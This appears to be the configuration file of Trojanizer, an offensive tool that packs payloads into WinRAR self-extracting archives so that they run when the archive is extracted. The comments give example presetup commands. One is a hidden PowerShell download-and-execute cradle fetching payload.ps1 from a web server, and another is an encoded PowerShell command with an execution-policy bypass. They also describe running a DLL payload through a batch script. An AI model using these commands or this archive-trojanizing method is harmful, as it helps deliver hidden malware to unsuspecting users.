### Local (attacker) system arch (32bit/64bit)
# This next setting forces the main tool (Trojanizer.sh) to use 'wine32'
# or 'wine64' command syntax to install dependencies or run internal commands.
# values accepted are: x64 or x86
---------------
SYSTEM_ARCH=x86
---------------


### Replace SFX logo (image.bmp) in the created sfx archive
# Image size default is 93x302 pixels (use the same or smaller)
# values accepted are: OFF or ON
------------
USE_LOGO=OFF

### WinRAR Presetup sfx funtion to exec program/command before extraction
# HINT: The program must allready exists on target disk. Syntax examples:
# cmd.exe /c powershell.exe -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://webserver/payload.ps1'))"
# cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc TfD3DvcHtLhiSmoT==
# cmd.exe /c msg * 'Remote Code Execution using SFX presetup setting'
# values accepted are: OFF or ON
-------------
PRE_SETUP=OFF

### Single_file_execution, Lets look at the follow scenario:
# You have a dll payload to input that you need to execute upon extraction,
# but sfx archives can not execute directly dll files, This setting allow
# users to input one batch script(.bat) that its going to be used to execute
# the dll payload. All that Trojanizer needs to Do its to instruct the SFX archive
# to extract both files and execute the script.bat (thats contains orders to execute payload.dll).
# ---
# HINT: single_file_execution switch default behavior its to compress the two files inputed by user
# but only execute one of them at extraction time (the 2ยบ file inputed will be executed) ..
# values accepted are: OFF or ON
---------------
SINGLE_EXEC=OFF
---------------


### Wine drive_c full install path (local)
# HINT: execute 'winecfg' to build the required folders or
# change this value to point to your wine drive_c install path
-----------------------------
WINE_PATH=/root/.wine/drive_c
-----------------------------


### WinRAR.exe full install path (inside-wine)
# HINT: based on the local system arch used (local),
# winrar.exe migth be installed under: Program Files OR Program Files(x86)
---------------------------------------------------------------
WINRAR_PATH=/root/.wine/drive_c/Program Files/WinRAR/WinRAR.exe
---------------------------------------------------------------
